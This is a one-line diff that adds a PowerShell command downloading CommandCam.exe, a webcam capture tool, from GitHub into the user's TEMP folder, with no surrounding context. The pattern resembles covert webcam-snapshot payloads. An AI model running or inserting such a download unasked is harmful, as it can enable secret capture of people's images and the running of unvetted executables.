@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri ‘https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe’ -OutFile “$env:TEMP\CommandCam.exe”
